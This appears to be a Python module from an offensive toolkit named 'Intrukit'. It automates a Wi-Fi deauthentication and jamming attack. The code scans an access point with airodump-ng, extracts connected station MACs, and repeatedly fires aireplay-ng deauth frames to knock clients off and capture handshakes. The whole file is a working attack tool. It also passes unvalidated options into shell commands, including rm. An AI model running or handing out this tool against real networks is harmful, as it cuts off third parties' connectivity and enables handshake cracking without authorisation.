"""
Deauth

This module will de-authenticate client stations from an AP for caching
handshakes. The module is also capable of performing a jamming technique
to prevent clients from being able to re-connect to the given AP's BSSID.

"""

import subprocess, sys, time

class Module:
    """
    Module Class
    """

    __title__ = 'wifi.deauth'
    __date__ = '2018-01-24'
    __rank__ = 'normal'
    __description__ = 'Wifi client station de-authentication and jamming'

    __author__ = 'Intrukit'

    def __init__(self, CHANNEL=None, BSSID=None, INTERFACE=None, TIMEOUT=60, START=False, JAM=False,
                 JAMLOOP=100, CLEANUP=True, TEMP=None):
        """
        __init__(self, CHANNEL=None, BSSID=None, INTERFACE=None, TIMEOUT=60, START=False, JAM=False,
        JAMLOOP=100, CLEANUP=True, TEMP=None)

        :param CHANNEL:
        :param BSSID:
        :param INTERFACE:
        :param TIMEOUT:
        :param START:
        :param JAM:
        :param JAMLOOP:
        :param CLEANUP:
        :param TEMP:

        Initialize the module with the module's desired options
        """
        pwd = subprocess.Popen("pwd",
                               stdout=subprocess.PIPE,
                               shell=True).communicate()[0].decode('utf-8').replace("\n", "")

        self.__dict__['CHANNEL'] = {"value": CHANNEL, "required": True, "description": "The AP channel"}
        self.__dict__['BSSID'] = {"value": BSSID, "required": True, "description": "The AP BSSID"}
        self.__dict__['INTERFACE'] = {"value": INTERFACE, "required": True, "description": "The mon interface to use"}
        self.__dict__['TIMEOUT'] = {"value": TIMEOUT, "required": True,
                                    "description": "Airodump timeout before attacking"}
        self.__dict__['START'] = {"value": START, "required": False, "description": "Start/restart mon interface"}
        self.__dict__['JAM'] = {"value": JAM, "required": False, "description": "Run as station jammer"}
        self.__dict__['JAMLOOP'] = {"value": JAMLOOP, "required": True, "description": "How many times to jam"}
        self.__dict__['CLEANUP'] = {"value": CLEANUP, "required": False, "description": "Cleanup temp files"}
        self.__dict__['TEMP'] = {"value": "{}{}".format(pwd, '/results/wifi'), "required": True,
                                 "description": "Folder for temp files"}



    def run(self):
        """
        run(self)

        :return:

        Run the module
        """
        if self.CHANNEL['value'] and self.BSSID['value'] and self.INTERFACE['value'] and self.TIMEOUT['value']:
            banner = """

              .;'                     `;,    
             .;'  ,;'             `;,  `;,   De-authentication Jammer
            .;'  ,;'  ,;'     `;,  `;,  `;,  
            ::   ::   :   ( )   :   ::   ::  
            ':.  ':.  ':. /_\ ,:'  ,:'  ,:'  
             ':.  ':.    /___\    ,:'  ,:'   
              ':.       /_____\      ,:'     
                       /       \             

            """
            print(banner)
            if self.START['value'] is True:
                subprocess.call("airmon-ng stop {}".format(self.INTERFACE['value']), shell=True)
                subprocess.call("airmon-ng start {}".format(self.INTERFACE['value'].replace('mon', '')), shell=True)

            print(
                "Scanning stations connected to {} for {} sec before continuing to perform the deauth attack".format(
                    self.BSSID['value'], self.TIMEOUT['value']))
            subprocess.call(
                "xterm -hold -e 'airodump-ng --channel {} --output-format csv --output-format cap --write-interval 2 --write {}/MassDeauth {}' &".format(
                    self.CHANNEL['value'], self.TEMP['value'], self.INTERFACE['value']), shell=True)
            time.sleep(self.TIMEOUT['value'])

            print("Starting mass deauth attack against {}".format(self.BSSID['value']))

            def deauth():
                subprocess.call(
                    "cat {}/MassDeauth-* | sed -n -e '/Station MAC/,$p' | grep '{}' | cut -d',' -f1 | grep -v 'Station MAC' | grep ':' > {}/stations.txt".format(
                        self.TEMP['value'], self.BSSID['value'], self.TEMP['value']), shell=True)

                sfh = open('{}/stations.txt'.format(self.TEMP['value']), 'r')
                stations = sfh.readlines()
                sfh.close()

                i = 0
                while i < len(stations):
                    if stations[i] != "\r\n":
                        cmd = "aireplay-ng -0 1 -a {} -c {} {}".format(self.BSSID['value'],
                                                                       stations[i].replace('\n', ''),
                                                                       self.INTERFACE['value'])
                        i += 1
                        if "notassociated" not in cmd:
                            print("Running: {}".format(cmd))
                            subprocess.call(cmd, shell=True)
                    else:
                        i += 1

            if self.JAM['value']:
                loop_x_times = int(self.JAMLOOP['value'])
                lc = 0
                while lc <= loop_x_times:
                    deauth()
                    lc += 1
            else:
                deauth()

            if self.CLEANUP['value']:
                print("Cleaning up...")
                subprocess.call("rm {}/stations.txt".format(self.TEMP['value']), shell=True)
                subprocess.call("rm {}/MassDeauth-*.csv".format(self.TEMP['value']), shell=True)
                subprocess.call("rm {}/MassDeauth-*.cap".format(self.TEMP['value']), shell=True)
                print("Done")
        else:
            print("You are missing required module options. Please see: show options")

